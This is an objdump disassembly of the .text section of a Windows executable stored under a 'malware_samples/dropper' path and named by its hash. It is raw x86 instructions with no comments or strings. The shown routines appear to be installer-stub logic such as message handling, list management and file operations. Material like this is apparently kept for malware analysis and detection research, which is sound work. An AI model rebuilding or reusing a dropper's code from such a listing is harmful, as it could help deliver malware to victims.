
malware_samples/dropper/b0fb185461618e82915e7d701fc6dbe6164c45a7605f3110aff41ebc5c8447b1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 08 47 43 00    	mov    0x434708,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 10 47 43 00    	mov    0x434710,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 00 37 43 00       	push   $0x433700
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 28 47 43 00       	mov    0x434728,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 28 47 43 00    	mov    0x434728,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 2c 47 43 00    	cmp    0x43472c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 2c 47 43 00    	cmp    0x43472c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 28 47 43 00       	mov    0x434728,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 2c 47 43 00    	cmp    %esi,0x43472c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 10 47 43 00       	mov    0x434710,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 2c 47 43 00    	mov    0x43472c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 28 47 43 00    	mov    0x434728,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 43 00       	mov    $0x435000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 99 51 00 00       	call   0x40651f
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 30 47 43 00    	mov    0x434730,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 ec 36 43 00    	add    %eax,0x4336ec
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 d4 36 43 00    	push   0x4336d4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 ec 36 43 00    	push   0x4336ec
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 f0 ad 40 00       	push   $0x40adf0
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 13 42 00 00       	call   0x405644
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 08 47 43 00       	mov    0x434708,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 50 43 00       	mov    $0x435000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 4c ce 40 00    	mov    %ecx,0x40ce4c
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 cc 17 00 00    	ja     0x402c56
  40148a:	ff 24 8d 68 2c 40 00 	jmp    *0x402c68(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 ac 41 00 00       	call   0x405644
  401498:	e9 2c 0f 00 00       	jmp    0x4023c9
  40149d:	ff 05 cc 36 43 00    	incl   0x4336cc
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 1d 0f 00 00    	je     0x4023c9
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 11 0f 00 00       	jmp    0x4023c9
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 96 17 00 00       	jmp    0x402c61
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 72 41 00 00       	call   0x405644
  4014d2:	e9 7f 17 00 00       	jmp    0x402c56
  4014d7:	53                   	push   %ebx
  4014d8:	e8 d3 18 00 00       	call   0x402db0
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 61 17 00 00       	jmp    0x402c56
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 53 17 00 00       	jmp    0x402c56
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 39                	jg     0x401541
  401508:	7d 0e                	jge    0x401518
  40150a:	8b 04 85 80 47 43 00 	mov    0x434780(,%eax,4),%eax
  401511:	a3 54 ce 40 00       	mov    %eax,0x40ce54
  401516:	eb 0f                	jmp    0x401527
  401518:	c1 e0 02             	shl    $0x2,%eax
  40151b:	8b 88 80 47 43 00    	mov    0x434780(%eax),%ecx
  401521:	89 88 e0 47 43 00    	mov    %ecx,0x4347e0(%eax)
  401527:	6a 01                	push   $0x1
  401529:	e8 82 18 00 00       	call   0x402db0
  40152e:	59                   	pop    %ecx
  40152f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401532:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401535:	89 04 8d 80 47 43 00 	mov    %eax,0x434780(,%ecx,4)
  40153c:	e9 15 17 00 00       	jmp    0x402c56
  401541:	c1 e0 02             	shl    $0x2,%eax
  401544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401547:	8d 88 80 47 43 00    	lea    0x434780(%eax),%ecx
  40154d:	8b 80 e0 47 43 00    	mov    0x4347e0(%eax),%eax
  401553:	89 01                	mov    %eax,(%ecx)
  401555:	0f 8d fb 16 00 00    	jge    0x402c56
  40155b:	a1 54 ce 40 00       	mov    0x40ce54,%eax
  401560:	89 01                	mov    %eax,(%ecx)
  401562:	e9 ef 16 00 00       	jmp    0x402c56
  401567:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40156a:	8d 34 85 80 47 43 00 	lea    0x434780(,%eax,4),%esi
  401571:	33 c0                	xor    %eax,%eax
  401573:	8b 0e                	mov    (%esi),%ecx
  401575:	3b cb                	cmp    %ebx,%ecx
  401577:	0f 94 c0             	sete   %al
  40157a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40157d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401581:	89 0e                	mov    %ecx,(%esi)
  401583:	e9 d9 16 00 00       	jmp    0x402c61
  401588:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40158b:	ff 34 85 80 47 43 00 	push   0x434780(,%eax,4)
  401592:	57                   	push   %edi
  401593:	e9 38 16 00 00       	jmp    0x402bd0
  401598:	8b 0d d0 36 43 00    	mov    0x4336d0,%ecx
  40159e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4015a4:	3b cb                	cmp    %ebx,%ecx
  4015a6:	74 09                	je     0x4015b1
  4015a8:	ff 75 d4             	push   -0x2c(%ebp)
  4015ab:	51                   	push   %ecx
  4015ac:	ff d6                	call   *%esi
  4015ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4015b1:	8b 0d e4 36 43 00    	mov    0x4336e4,%ecx
  4015b7:	3b cb                	cmp    %ebx,%ecx
  4015b9:	0f 84 97 16 00 00    	je     0x402c56
  4015bf:	50                   	push   %eax
  4015c0:	51                   	push   %ecx
  4015c1:	ff d6                	call   *%esi
  4015c3:	e9 8e 16 00 00       	jmp    0x402c56
  4015c8:	6a f0                	push   $0xfffffff0
  4015ca:	e8 03 18 00 00       	call   0x402dd2
  4015cf:	ff 75 d4             	push   -0x2c(%ebp)
  4015d2:	50                   	push   %eax
  4015d3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015d9:	85 c0                	test   %eax,%eax
  4015db:	0f 85 75 16 00 00    	jne    0x402c56
  4015e1:	e9 74 13 00 00       	jmp    0x40295a
  4015e6:	6a f0                	push   $0xfffffff0
  4015e8:	e8 e5 17 00 00       	call   0x402dd2
  4015ed:	50                   	push   %eax
  4015ee:	89 45 08             	mov    %eax,0x8(%ebp)
  4015f1:	e8 43 49 00 00       	call   0x405f39
  4015f6:	8b f0                	mov    %eax,%esi
  4015f8:	3b f3                	cmp    %ebx,%esi
  4015fa:	74 61                	je     0x40165d
  4015fc:	6a 5c                	push   $0x5c
  4015fe:	56                   	push   %esi
  4015ff:	e8 b7 48 00 00       	call   0x405ebb
  401604:	8b f0                	mov    %eax,%esi
  401606:	66 8b 3e             	mov    (%esi),%di
  401609:	66 89 1e             	mov    %bx,(%esi)
  40160c:	66 3b fb             	cmp    %bx,%di
  40160f:	75 1f                	jne    0x401630
  401611:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401614:	74 1a                	je     0x401630
  401616:	e8 6f 45 00 00       	call   0x405b8a
  40161b:	85 c0                	test   %eax,%eax
  40161d:	74 11                	je     0x401630
  40161f:	ff 75 08             	push   0x8(%ebp)
  401622:	e8 ec 44 00 00       	call   0x405b13
  401627:	3b c3                	cmp    %ebx,%eax
  401629:	74 28                	je     0x401653
  40162b:	ff 45 fc             	incl   -0x4(%ebp)
  40162e:	eb 08                	jmp    0x401638
  401630:	ff 75 08             	push   0x8(%ebp)
  401633:	e8 35 45 00 00       	call   0x405b6d
  401638:	3b c3                	cmp    %ebx,%eax
  40163a:	74 17                	je     0x401653
  40163c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401641:	75 0d                	jne    0x401650
  401643:	ff 75 08             	push   0x8(%ebp)
  401646:	ff 15 dc 80 40 00    	call   *0x4080dc
  40164c:	a8 10                	test   $0x10,%al
  40164e:	75 03                	jne    0x401653
  401650:	ff 45 fc             	incl   -0x4(%ebp)
  401653:	66 89 3e             	mov    %di,(%esi)
  401656:	46                   	inc    %esi
  401657:	46                   	inc    %esi
  401658:	66 3b fb             	cmp    %bx,%di
  40165b:	75 9f                	jne    0x4015fc
  40165d:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401660:	74 2d                	je     0x40168f
  401662:	6a e6                	push   $0xffffffe6
  401664:	e8 ba fd ff ff       	call   0x401423
  401669:	ff 75 08             	push   0x8(%ebp)
  40166c:	68 00 00 44 00       	push   $0x440000
  401671:	e8 49 4f 00 00       	call   0x4065bf
  401676:	ff 75 08             	push   0x8(%ebp)
  401679:	ff 15 e0 80 40 00    	call   *0x4080e0
  40167f:	85 c0                	test   %eax,%eax
  401681:	0f 85 cf 15 00 00    	jne    0x402c56
  401687:	ff 45 fc             	incl   -0x4(%ebp)
  40168a:	e9 c7 15 00 00       	jmp    0x402c56
  40168f:	6a f5                	push   $0xfffffff5
  401691:	e9 87 0c 00 00       	jmp    0x40231d
  401696:	53                   	push   %ebx
  401697:	e8 36 17 00 00       	call   0x402dd2
  40169c:	50                   	push   %eax
  40169d:	e8 7a 52 00 00       	call   0x40691c
  4016a2:	e9 ad 06 00 00       	jmp    0x401d54
  4016a7:	6a d0                	push   $0xffffffd0
  4016a9:	e8 24 17 00 00       	call   0x402dd2
  4016ae:	6a df                	push   $0xffffffdf
  4016b0:	8b f0                	mov    %eax,%esi
  4016b2:	e8 1b 17 00 00       	call   0x402dd2
  4016b7:	6a 13                	push   $0x13
  4016b9:	8b f8                	mov    %eax,%edi
  4016bb:	e8 12 17 00 00       	call   0x402dd2
  4016c0:	57                   	push   %edi
  4016c1:	56                   	push   %esi
  4016c2:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016c8:	85 c0                	test   %eax,%eax
  4016ca:	74 07                	je     0x4016d3
  4016cc:	6a e3                	push   $0xffffffe3
  4016ce:	e9 4a 0c 00 00       	jmp    0x40231d
  4016d3:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
